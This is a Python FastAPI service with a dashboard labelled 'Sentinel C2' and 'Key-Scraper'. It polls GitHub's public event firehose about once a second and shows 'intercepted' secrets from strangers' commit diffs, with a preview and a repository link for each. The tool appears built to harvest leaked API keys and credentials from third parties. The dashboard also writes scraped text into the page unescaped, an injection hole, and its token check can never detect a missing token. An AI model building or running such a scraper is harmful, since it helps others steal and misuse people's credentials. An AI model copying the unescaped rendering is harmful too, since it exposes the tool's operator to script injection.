import asyncio
import time
import json
import os
import httpx
from fastapi import FastAPI
from fastapi.responses import HTMLResponse
import uvicorn
from scanner import extract_and_scan_diffs, RECENT_CATCHES, STATS, CURRENT_SCANS

app = FastAPI()

STATE_FILE = "/data/sentinel_state.json"
GITHUB_TOKEN = os.getenv("GITHUB_TOKEN", "ENTER_GITHUB_TOKEN")

if not GITHUB_TOKEN:
    print("\n[!!!] CRITICAL: GITHUB_TOKEN MISSING. Running in restricted 60/hr mode! [!!!]\n")
else:
    print("\n[+] AUTH VERIFIED: GITHUB_TOKEN is loaded. Firehose unlocked.\n")

def load_state():
    if os.path.exists(STATE_FILE):
        try:
            with open(STATE_FILE, "r") as f:
                return json.load(f)
        except Exception:
            pass
    return {"etag": None, "last_poll": 0.0}

def save_state(etag):
    try:
        os.makedirs(os.path.dirname(STATE_FILE), exist_ok=True)
        with open(STATE_FILE, "w") as f:
            json.dump({"etag": etag, "last_poll": time.time()}, f)
    except Exception as e:
        print(f"[-] State save failed: {e}")

async def firehose_metronome():
    state = load_state()
    limits = httpx.Limits(max_keepalive_connections=20, max_connections=40)
    
    async with httpx.AsyncClient(limits=limits, http2=True) as client:
        while True:
            start_time = time.time()
            headers = {
                "Accept": "application/vnd.github.v3+json",
                "User-Agent": "Limerence-Sentinel/4.0"
            }
            if GITHUB_TOKEN:
                headers["Authorization"] = f"Bearer {GITHUB_TOKEN}"
            
            if state["etag"]:
                headers["If-None-Match"] = state["etag"]

            try:
                resp = await client.get("https://api.github.com/events", headers=headers, timeout=8.0)

                if resp.status_code == 200:
                    new_etag = resp.headers.get("ETag")
                    if new_etag:
                        state["etag"] = new_etag
                        save_state(new_etag)
                        
                    events = resp.json()
                    print(f"[*] 200 OK - Bursting {len(events)} events.")
                    await extract_and_scan_diffs(client, events)
                    
                elif resp.status_code == 304:
                    pass 
                    
                elif resp.status_code in (403, 429):
                    retry_after = int(resp.headers.get("Retry-After", 60))
                    print(f"[!] Target throttling detected. Sleeping for {retry_after}s.")
                    await asyncio.sleep(retry_after)

            except Exception as e:
                pass
            execution_time = time.time() - start_time
            sleep_time = max(0.0, 0.82 - execution_time)
            await asyncio.sleep(sleep_time)

@app.on_event("startup")
async def startup_event():
    asyncio.create_task(firehose_metronome())

@app.get("/api/data")
async def get_live_data():
    return {
        "status": "Authenticating..." if not GITHUB_TOKEN else "ACTIVE - FIREHOSE LINKED",
        "scanned": STATS["total_scanned"],
        "caught": STATS["total_caught"],
        "recent": list(RECENT_CATCHES),
        "scans": list(CURRENT_SCANS)
    }

@app.get("/")
async def serve_dashboard():
    html_content = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Sentinel C2</title>
        <style>
            :root { --bg: #030303; --panel: #0a0a0a; --accent: #00ff44; --alert: #ff2a2a; --text: #cccccc; --border: #1a1a1a; }
            body { background-color: var(--bg); color: var(--accent); font-family: 'Courier New', Courier, monospace; margin: 0; padding: 20px; height: 100vh; display: flex; flex-direction: column; box-sizing: border-box; }
            h1 { color: #ffffff; border-bottom: 1px solid var(--border); padding-bottom: 10px; margin-top: 0; font-size: 1.5em; text-shadow: 0 0 5px var(--accent); }
            
            .dashboard { display: flex; gap: 20px; flex: 1; min-height: 0; }
            
            .stats-sidebar { width: 250px; display: flex; flex-direction: column; gap: 15px; }
            .stat-box { background: var(--panel); border: 1px solid var(--border); padding: 15px; border-radius: 4px; box-shadow: 0 4px 6px rgba(0,0,0,0.5); }
            .stat-title { color: #666; font-size: 0.85em; text-transform: uppercase; letter-spacing: 1px; }
            .stat-value { color: #fff; font-size: 2em; font-weight: bold; margin-top: 5px; text-shadow: 0 0 10px rgba(255,255,255,0.2); }
            .status-val { color: var(--accent); font-size: 1.1em; }
            .alert-val { color: var(--alert); text-shadow: 0 0 10px rgba(255,42,42,0.4); }

            .main-content { flex: 1; display: flex; gap: 20px; }
            .panel { background: var(--panel); border: 1px solid var(--border); border-radius: 4px; padding: 15px; display: flex; flex-direction: column; }
            .panel h2 { color: #555; font-size: 1em; text-transform: uppercase; letter-spacing: 2px; margin-top: 0; border-bottom: 1px solid var(--border); padding-bottom: 10px; }
            
            .left-col { flex: 2; }
            .right-col { flex: 1; }

            .scrollable { overflow-y: auto; flex: 1; padding-right: 5px; }
            .scrollable::-webkit-scrollbar { width: 5px; }
            .scrollable::-webkit-scrollbar-thumb { background: #333; border-radius: 5px; }

            table { width: 100%; border-collapse: collapse; }
            th { text-align: left; padding: 8px; color: #666; font-size: 0.8em; position: sticky; top: 0; background: var(--panel); }
            td { padding: 10px 8px; border-bottom: 1px solid #111; font-size: 0.9em; color: var(--text); }
            
            .type-badge { background: #1a0000; padding: 4px 8px; border-radius: 3px; color: var(--alert); font-weight: bold; font-size: 0.85em; border: 1px solid #330000; }
            a { color: var(--accent); text-decoration: none; transition: 0.2s; }
            a:hover { color: #fff; text-shadow: 0 0 5px var(--accent); }

            .scan-feed { font-size: 0.85em; display: flex; flex-direction: column; gap: 5px; }
            .scan-item { color: #555; padding: 4px 0; border-bottom: 1px dashed #111; animation: fadeIn 0.3s ease-in; }
            .scan-repo { color: #888; }
            @keyframes fadeIn { from { opacity: 0; transform: translateX(-10px); } to { opacity: 1; transform: translateX(0); } }
        </style>
    </head>
    <body>
        <h1>[💎] Key-Scraper</h1>
        
        <div class="dashboard">
            <div class="stats-sidebar">
                <div class="stat-box">
                    <div class="stat-title">System Link</div>
                    <div class="stat-value status-val" id="status">Booting...</div>
                </div>
                <div class="stat-box">
                    <div class="stat-title">Diffs Scanned</div>
                    <div class="stat-value" id="scanned">0</div>
                </div>
                <div class="stat-box">
                    <div class="stat-title">Critical Intercepts</div>
                    <div class="stat-value alert-val" id="caught">0</div>
                </div>
            </div>

            <div class="main-content">
                <div class="panel left-col">
                    <h2>Live Intercept Ledger</h2>
                    <div class="scrollable">
                        <table>
                            <thead><tr><th>Target Vector</th><th>Repository</th><th>Pattern Mask</th></tr></thead>
                            <tbody id="log-body"></tbody>
                        </table>
                    </div>
                </div>
                <div class="panel right-col">
                    <h2>Global Stream (Live)</h2>
                    <div class="scrollable" id="scan-container">
                        <div class="scan-feed" id="scan-body"></div>
                    </div>
                </div>
            </div>
        </div>

        <script>
            async function pollData() {
                try {
                    const res = await fetch('/api/data');
                    const data = await res.json();
                    
                    document.getElementById('status').innerText = data.status;
                    document.getElementById('scanned').innerText = data.scanned;
                    document.getElementById('caught').innerText = data.caught;
                    
                    const tbody = document.getElementById('log-body');
                    let logHtml = '';
                    data.recent.forEach(item => {
                        logHtml += `<tr>
                            <td><span class="type-badge">${item.type}</span></td>
                            <td><a href="${item.url}" target="_blank">${item.repo}</a></td>
                            <td style="color: #999;">${item.preview}</td>
                        </tr>`;
                    });
                    if (tbody.innerHTML !== logHtml) tbody.innerHTML = logHtml;

                    const sbody = document.getElementById('scan-body');
                    let scanHtml = '';
                    data.scans.forEach(scan => {
                        scanHtml += `<div class="scan-item">Intercepting <span class="scan-repo">${scan.repo}</span>...</div>`;
                    });
                    
                    if (sbody.innerHTML !== scanHtml) {
                        sbody.innerHTML = scanHtml;
                    }

                } catch (e) {
                    document.getElementById('status').innerText = 'LINK SEVERED';
                    document.getElementById('status').style.color = '#ff2a2a';
                }
            }
            setInterval(pollData, 1000);
            pollData();
        </script>
    </body>
    </html>
    """
    return HTMLResponse(content=html_content)

if __name__ == "__main__":
    uvicorn.run("app:app", host="0.0.0.0", port=7860)
    
